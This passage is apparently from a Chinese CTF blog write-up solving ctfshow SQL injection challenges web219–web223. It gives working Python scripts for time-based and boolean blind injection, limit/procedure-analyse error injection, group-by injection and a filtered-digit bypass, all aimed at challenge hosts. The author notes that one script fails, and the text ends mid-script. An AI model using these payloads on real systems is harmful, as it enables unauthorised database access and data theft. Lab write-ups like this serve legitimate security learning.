class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://6c19b909-06f4-412b-ba28-581287b784fc.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxca&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from ctfshow_flagxca),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p>最后一个盲注了，赶紧做完赶紧润。<br>过滤了substr，可以用正则，left都可以。用limit代替group_concat() </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 13:25   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://2db91241-b5ab-4eec-9035-df2df4f18a46.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select table_name from information_schema.tables where table_schema = database() limit 0,1&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select column_name from information_schema.columns where table_name = &quot;ctfshow_flagxcac&quot; limit 1,1&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select flagaabcc from ctfshow_flagxcac&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(left((&#123;&#125;),&#123;&#125;)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, res + j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>其他脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">&quot;select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://d82b1a0b-aba4-4fed-aa83-62d59d7df4ee.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#1) and if((database())regexp(&#x27;^ctfshow&#x27;),(select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f),0)#</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((database())regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((select table_name from information_schema.tables where table_schema=database() limit 0,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1) and if((select flagaabcc from ctfshow_flagxcac limit 0,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(flag + j,bypass),</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">3</span> <span class="keyword">and</span> end - start &lt; <span class="number">5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] 开始盲注第&#123;&#125;位&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><blockquote><p><a href="https://www.jb51.net/article/99980.htm"><strong>https://www.jb51.net/article/99980.htm</strong></a></p></blockquote><h3 id="limit注入-MySQL利用procedure-analyse-函数优化表结构-这个题本质就是报错注入"><a href="#limit注入-MySQL利用procedure-analyse-函数优化表结构-这个题本质就是报错注入" class="headerlink" title="limit注入 MySQL利用procedure analyse()函数优化表结构 这个题本质就是报错注入"></a>limit注入 MySQL利用procedure analyse()函数优化表结构 这个题本质就是报错注入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * <span class="keyword">from</span> ctfshow_user limit ($page-<span class="number">1</span>)*$limit,$limit;</span><br></pre></td></tr></table></figure><p>注入点在get处，limit注入使用标准：<br><code>select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code><br>修改为payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=<span class="number">1</span>&amp;limit=<span class="number">1</span> procedure analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689329494340-363ae1db-f3a1-4694-9bad-d0ec6cc660b7.png" alt="image.png"><br>直接交数据库名即可</p><h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h3 id="group-by注入"><a href="#group-by注入" class="headerlink" title="group by注入"></a>group by注入</h3><p>直接在group by的位置注入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form.on(<span class="string">&#x27;submit(*)&#x27;</span>, function(data)&#123;</span><br><span class="line">    var table = layui.table;</span><br><span class="line">    table.reload(<span class="string">&#x27;user_table&#x27;</span>, &#123;</span><br><span class="line">      url:<span class="string">&#x27;api/?u=username&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> false; </span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  $sql = select * <span class="keyword">from</span> ctfshow_user group by $username;</span><br></pre></td></tr></table></figure><p>直接用时间盲注即可：<br>测试时会发现sleep的值会被方法二十倍。<br><code>?u=sleep(0.5)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689331879814-ce852ff0-cdee-4a48-9eda-66304003d4b5.png" alt="image.png"><br>然后就使用之前的时间盲注脚本即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0750fdff-bead-49bc-b6cb-501f23e1457d.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789,&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flaga&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from ctfshow_flaga),1,48)&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),sleep(0.05),1)&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url + payload.<span class="built_in">format</span>(inside, i, j), timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h1 id="web223（勾吧题，做破防了）"><a href="#web223（勾吧题，做破防了）" class="headerlink" title="web223（勾吧题，做破防了）"></a>web223（勾吧题，做破防了）</h1><p>提示用户名不能用数字，因此可以用true代替，但是用true的代价就是一次循环20s，那就用布尔盲注代替。<br>看了wp发现使用的非常巧妙：<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(true,username,false)</span><br></pre></td></tr></table></figure><p>如果返回true时，就会执行<code>group by username</code>，导致参数变多：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334070399-917c5ad2-3dc9-4c8b-b024-ab234ed78616.png" alt="image.png"><br>而false时，返回false字符串，数据就相对较少：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334102676-c0d798b5-618c-4450-98f9-f1ee4247ba16.png" alt="image.png"><br>因此可以做出盲注，构建脚本:<br>注意，这里过滤了数字1，因此只能用true代替。<br>给我杀了把 傻逼题，勾吧脚本真不知道哪错了：（这个脚本出不来，但是真不想改了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注3.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 19:29   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_true</span>(<span class="params">num</span>):</span><br><span class="line">    res = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    res += (num - <span class="number">1</span>) * <span class="string">&#x27;+true&#x27;</span></span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkNum</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">elif</span> s <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> calculate_true(<span class="built_in">int</span>(s))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://364e23b2-79ce-4183-a604-8d8d1666bd18.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line">inside = <span class="string">&quot;database()&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># inside = &quot;admin&#x27;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;if(substr((&#123;&#125;),&#123;&#125;,1)=(&quot;&#123;&#125;&quot;),username,false)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        nurl = url</span><br><span class="line">        nurl += payload.<span class="built_in">format</span>(inside, calculate_true(i), checkNum(j)).replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;true&#x27;</span>) <span class="comment"># 1被过滤了，别忘了</span></span><br><span class="line">        r = requests.post(nurl)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="comment"># print(nurl)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;AUTO&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure><p>看看远处的正确脚本吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://90b8ab81-6a05-4ebc-ab88-62e8442c0e89.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num2true</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;(&#x27;</span> + <span class="string">&#x27;true%2b&#x27;</span> * (num-<span class="number">1</span>) + <span class="string">&#x27;true)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">a = num2true(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="built_in">min</span>,<span class="built_in">max</span> = <span class="number">32</span>, <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == j):</span><br><span class="line">            <span class="built_in">str</span> += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 爆表名</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># 爆列</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># 爆值</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),<span class="subst">&#123;num2true(i)&#125;</span>,true))&lt;<span class="subst">&#123;num2true(j)&#125;</span>,username,true)&quot;</span></span><br><span class="line">        r = requests.get(url=url+payload).text</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = j</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span 